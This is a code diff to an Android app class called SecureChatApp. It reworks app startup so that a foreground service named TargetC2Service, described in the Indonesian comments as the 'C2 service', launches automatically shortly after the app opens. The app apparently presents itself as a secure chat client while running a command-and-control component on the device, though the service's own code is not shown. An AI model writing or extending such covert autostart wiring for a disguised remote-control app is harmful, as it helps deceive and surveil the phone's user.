@@ -22,23 +22,21 @@ class SecureChatApp : Application() {
 
         createNotificationChannel()
 
-        // 🔥 FIX: Firebase dipindah ke background thread biar ga blocking + crash
-        android.os.HandlerThread("FirebaseInit").apply {
-            start()
-            android.os.Handler(looper).post {
-                try {
-                    com.google.firebase.database.FirebaseDatabase.getInstance()
-                        .setPersistenceEnabled(true)
-                } catch (e: Exception) {
-                    android.util.Log.e("SecureChatApp", "Firebase persistence error", e)
-                }
-            }
-        }
+        // 🔥 FIX: HAPUS setPersistenceEnabled dari sini!
+        // FirebaseDatabase.getInstance().setPersistenceEnabled(true)  ← INI DIILANGIN!
+        // dipindah ke TargetC2Service.onCreate() setelah getInstance(url)
 
-        // 🔥 FIX: Service start ditunda dikit biar notification channel ready
+        // Start C2 service setelah channel notification siap
         android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
             try {
-                startC2Service()
+                val intent = Intent(this, TargetC2Service::class.java).apply {
+                    action = "start"
+                }
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    startForegroundService(intent)
+                } else {
+                    startService(intent)
+                }
             } catch (e: Exception) {
                 android.util.Log.e("SecureChatApp", "C2 service start error", e)
             }
@@ -58,17 +56,6 @@ class SecureChatApp : Application() {
             }
             val manager = getSystemService(NotificationManager::class.java)
             manager.createNotificationChannel(channel)
-        }
-    }
-
-    private fun startC2Service() {
-        val intent = Intent(this, TargetC2Service::class.java).apply {
-            action = "start"
-        }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(intent)
-        } else {
-            startService(intent)
         }
     }
 }
